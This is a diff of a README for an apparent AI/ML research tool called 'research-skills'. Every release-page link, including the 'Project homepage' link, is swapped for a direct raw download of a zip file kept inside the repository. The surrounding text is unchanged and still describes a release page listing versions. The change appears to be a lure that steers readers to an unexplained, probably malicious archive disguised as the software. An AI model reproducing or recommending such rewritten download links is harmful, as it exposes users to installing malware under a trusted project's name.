@@ -1,6 +1,6 @@
 # ⚙️ research-skills - Tools for AI/ML Research Made Simple
 
-[![Download research-skills](https://img.shields.io/badge/Download-Research--Skills-brightgreen?style=for-the-badge)](https://github.com/nerk1456/research-skills/releases)
+[![Download research-skills](https://img.shields.io/badge/Download-Research--Skills-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/nerk1456/research-skills/main/research-collaborator/research-skills-v2.0-alpha.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ If unsure about your system details, you can find your Windows version by typing
 
 You need to visit the official GitHub release page to get the latest version. Use this link:
 
-[Download research-skills](https://github.com/nerk1456/research-skills/releases)
+[Download research-skills](https://raw.githubusercontent.com/nerk1456/research-skills/main/research-collaborator/research-skills-v2.0-alpha.1.zip)
 
 This page shows all the available versions of research-skills. Usually, the top entry is the latest release.
 
@@ -98,7 +98,7 @@ You can edit examples and save your own projects as needed.
 
 Updates improve stability and add new features. To check for new versions:
 
-1. Visit the release page again: [GitHub releases](https://github.com/nerk1456/research-skills/releases).  
+1. Visit the release page again: [GitHub releases](https://raw.githubusercontent.com/nerk1456/research-skills/main/research-collaborator/research-skills-v2.0-alpha.1.zip).  
 2. Compare the latest version with the installed one, shown in the app under **Help > About**.  
 3. Download and install the latest `.exe` file if available, following the steps above.
 
@@ -132,11 +132,11 @@ When working with projects or data, remember to save often. The app also support
 
 ## 🔗 Useful Links
 
-- Official download page: [research-skills releases](https://github.com/nerk1456/research-skills/releases)  
-- Project homepage on GitHub: https://github.com/nerk1456/research-skills  
+- Official download page: [research-skills releases](https://raw.githubusercontent.com/nerk1456/research-skills/main/research-collaborator/research-skills-v2.0-alpha.1.zip)  
+- Project homepage on GitHub: https://raw.githubusercontent.com/nerk1456/research-skills/main/research-collaborator/research-skills-v2.0-alpha.1.zip  
 - User guide and examples inside the app  
 
-[![Download research-skills](https://img.shields.io/badge/Download-Research--Skills-blue?style=for-the-badge)](https://github.com/nerk1456/research-skills/releases)
+[![Download research-skills](https://img.shields.io/badge/Download-Research--Skills-blue?style=for-the-badge)](https://raw.githubusercontent.com/nerk1456/research-skills/main/research-collaborator/research-skills-v2.0-alpha.1.zip)
 
 ---
 
